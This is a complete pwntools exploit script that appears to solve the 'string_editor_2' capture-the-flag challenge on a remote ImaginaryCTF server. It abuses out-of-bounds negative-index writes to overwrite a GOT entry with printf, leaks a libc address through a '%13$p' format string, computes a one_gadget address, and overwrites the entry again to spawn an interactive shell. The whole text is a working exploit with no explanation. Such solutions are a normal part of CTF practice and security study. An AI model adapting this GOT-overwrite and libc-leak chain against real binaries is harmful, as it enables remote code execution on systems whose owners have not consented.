from pwn import *
#p=process('./string_editor_2')
p=remote('chal.imaginaryctf.org',42005)
elf = ELF('././string_editor_2')
libc = ELF('libc.so.6')
#raw_input("DEBUG")


def change(idx,a):
	p.recvuntil('(enter in 15 to see utils)\n')
	p.sendline(str(idx))
	p.recvuntil('should be in that index?\n')
	p.sendline(a)


plt_printf = 0x400600

change(0,"%")
change(1,str(1))
change(2,str(3))
change(3,"$")
change(4,"p")

b=0
for i in p64(plt_printf):
	change(-104+b,i)
	b+=1
p.sendline("15")
p.sendline("2")

p.recvuntil('3. Exit\n')
leak = int(p.recv(14),16)
print "Leak: ",hex(leak)
base = leak - 0x0270b3
print "Base: ",hex(base)
#0xe6c7e 0xe6c81 0xe6c84
one = base + 0xe6c81
print "One: ",hex(one)

b=0
for s in p64(one):
	change(-104+b,s)
	b+=1
p.sendline("15")
p.sendline("2")

p.interactive()